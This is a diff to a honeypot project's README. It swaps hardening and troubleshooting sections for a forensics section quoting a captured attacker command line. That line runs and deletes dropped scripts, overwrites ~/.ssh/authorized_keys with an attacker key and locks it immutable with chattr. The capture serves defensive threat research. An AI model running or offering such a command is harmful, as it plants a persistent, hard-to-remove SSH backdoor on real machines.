@@ -36,7 +36,7 @@ Utilizing the **Cowrie** high-interaction SSH/Telnet honeypot, the system captur
 
 ---
 
-## 🦠 III. Post-Exploitation Forensics: Mirai Botnet Capture
+## 🦠 III. Initial Execution: Mirai Botnet Capture
 Following a successful brute-force attack (`root/root`) by a South Korean IP address, the system captured the immediate post-exploitation keystrokes executed by the automated threat actor.
 
 ![Keystroke Logging](images/keystroke_logs.png)
@@ -52,31 +52,9 @@ Following a successful brute-force attack (`root/root`) by a South Korean IP add
 
 ---
 
-## 🛠️ IV. Troubleshooting & Security Hardening
-This deployment required significant manual engineering and hardening to transition from an automated install to a production-ready security asset.
+## 🔬 IV. Advanced Forensics: Persistence & Defense Evasion
+Extended monitoring captured advanced post-exploitation playbooks. One notable capture involved a distinct threat actor attempting to establish a persistent, unremovable backdoor using Linux file attributes and encoded Command & Control (C2) signaling.
 
-| Symptom | Root Cause | Technical Resolution |
-| :--- | :--- | :--- |
-| **Container Exit Code 137** | **OOM (Out of Memory) Killer:** The ELK stack exceeded the 8GB RAM limit during Java heap initialization. | Upgraded Azure VM to **16GB RAM** to provide sufficient overhead for Elasticsearch and 20+ honeypot containers. |
-| **`tpotinit` Loop (Exit Code 1)** | **Defective Install Script:** The automated installer failed to populate the `WEB_USER` environment variable. | Bypassed the abstraction layer and used `sed` to inject base64-encoded credentials directly into the `.env` file. |
-
-### Zero-Trust Management Plane
-Initial log analysis showed 4,736 unauthorized hits to the management port (64297). To mitigate the risk of an administrative compromise, I implemented a strict **Source-IP Whitelist** via Azure NSGs.
-
-![Azure NSG Whitelist](images/azure_nsg_whitelist.png)
-> *By restricting Ports 64294, 64295, and 64297 exclusively to `[YOUR_HOME_IP]`, the administrative attack surface was reduced to zero while keeping the honeypot sensor ports open to the public internet.*
-
----
-
-## 🎓 V. Cybersecurity Domain Mapping
-This project demonstrates practical application of core concepts from the **CompTIA Security+** and **Google Cybersecurity** frameworks.
-
-| Cybersecurity Domain | Core Concept Applied |
-| :--- | :--- |
-| **Network Security** | **Zero Trust / Perimeter Defense:** Implemented IP whitelisting to enforce the Principle of Least Privilege on management interfaces. |
-| **Security Architecture** | **Defense-in-Depth:** Segmented high-interaction traps (Cowrie) from the host OS management plane using cloud-native firewalls. |
-| **Incident Response** | **Log Management & SIEM:** Utilized command-line utilities (`grep`, `awk`) and Kibana (KQL) to parse JSON logs and identify Indicators of Compromise (IOCs). |
-| **Threat Intelligence** | **OSINT / Attribution:** Extracted IP addresses and file hashes from attack logs and utilized Open-Source Intelligence (VirusTotal) to attribute attacks to known threat actors (Mirai). |
-
----
-*Disclaimer: This project was deployed in an isolated, cloud-hosted environment strictly for educational and threat intelligence gathering purposes.*
+**Raw Log Capture:**
+```bash
+chmod +x clean.sh; sh clean.sh; rm -rf clean.sh; chmod +x setup.sh; sh setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqHrvnL...[truncated]... rsa-key-20230629" > ~/.ssh/authorized_keys; chattr +ai ~/.ssh/authorized_keys; uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"
